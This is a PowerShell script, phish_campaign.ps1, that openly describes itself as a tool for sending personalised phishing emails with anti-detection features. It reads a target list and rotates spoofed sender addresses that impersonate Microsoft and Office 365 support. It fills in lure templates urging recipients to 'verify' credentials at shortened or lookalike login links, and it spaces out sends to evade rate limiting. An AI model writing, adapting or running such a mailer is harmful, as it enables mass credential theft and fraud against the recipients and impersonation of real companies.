# phish_campaign.ps1 - Optimized Bulk Email Campaign Script
# Modified: $(Get-Date -Format "yyyy-MM-dd")
# Purpose: Generate personalized phishing emails with anti-detection features

param(
    [string]$TargetsFile = "targets.csv",
    [string]$SmtpServer = "smtp.gmail.com",
    [int]$SmtpPort = 587,
    [string]$CredentialsFile = "creds.xml"
)

# Import required modules
Add-Type -AssemblyName System.Net
Add-Type -AssemblyName System.Net.Mail

# Load target data from CSV
$targets = Import-Csv -Path $TargetsFile
Write-Host "Loaded $($targets.Count) targets from $TargetsFile" -ForegroundColor Green

# Load credentials securely (stored using Export-CliXml)
if (Test-Path $CredentialsFile) {
    $cred = Import-CliXml -Path $CredentialsFile
} else {
    Write-Error "Credentials file not found. Please create using: Get-Credential | Export-CliXml -Path '$CredentialsFile'"
    exit 1
}

# Array of sender addresses to rotate (improves deliverability)
$senderAddresses = @(
    "security-alert@outlook.com",
    "noreply@microsoft-support.com",
    "account-update@gmail.com",
    "admin@cloud-services.net",
    "notifications@office365-team.com"
)

# Email templates with placeholders for personalization
$templates = @(
    "Dear {Name}, your {Company} account requires immediate verification. Click here to secure: http://bit.ly/{RandomID}",
    "Urgent: {Company} security update for {Name}. Your credentials may be compromised. Verify at: http://tinyurl.com/{RandomID}",
    "{Name}, suspicious activity detected on your {Company} email. Review now: https://login-{Company}.com/verify",
    "Action Required: {Company} password expiration notice for {Name}. Update at: http://{Company}-secure.net/login"
)

# Initialize SMTP client with TLS
$smtpClient = New-Object System.Net.Mail.SmtpClient($SmtpServer, $SmtpPort)
$smtpClient.EnableSsl = $true
$smtpClient.Credentials = $cred.GetNetworkCredential()

$sentCount = 0
$failedCount = 0

foreach ($target in $targets) {
    try {
        # Randomize sender address for each email
        $sender = $senderAddresses | Get-Random
        $from = New-Object System.Net.Mail.MailAddress($sender, "Security Team")
        
        # Select random template and personalize
        $template = $templates | Get-Random
        $body = $template -replace "{Name}", $target.Name `
                          -replace "{Company}", $target.Company `
                          -replace "{RandomID}", (Get-Random -Minimum 10000 -Maximum 99999)
        
        # Create email message
        $message = New-Object System.Net.Mail.MailMessage
        $message.From = $from
        $message.To.Add($target.Email)
        $message.Subject = "Urgent: $($target.Company) Security Notification"
        $message.Body = $body
        $message.IsBodyHtml = $false
        
        # Add random delay between 2-10 seconds to avoid rate limiting
        Start-Sleep -Seconds (Get-Random -Minimum 2 -Maximum 10)
        
        # Send email
        $smtpClient.Send($message)
        Write-Host "Sent to $($target.Email) from $sender" -ForegroundColor Cyan
        $sentCount++
        
        # Dispose message to free resources
        $message.Dispose()
        
    } catch {
        Write-Warning "Failed to send to $($target.Email): $_"
        $failedCount++
    }
}

# Cleanup
$smtpClient.Dispose()

# Summary report
Write-Host "`nCampaign Complete!" -ForegroundColor Yellow
Write-Host "Successfully sent: $sentCount" -ForegroundColor Green
Write-Host "Failed: $failedCount" -ForegroundColor Red
Write-Host "Total targets: $($targets.Count)" -ForegroundColor Gray

# Log results to file
$logEntry = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss'),$sentCount,$failedCount"
Add-Content -Path "campaign_log.csv" -Value $logEntry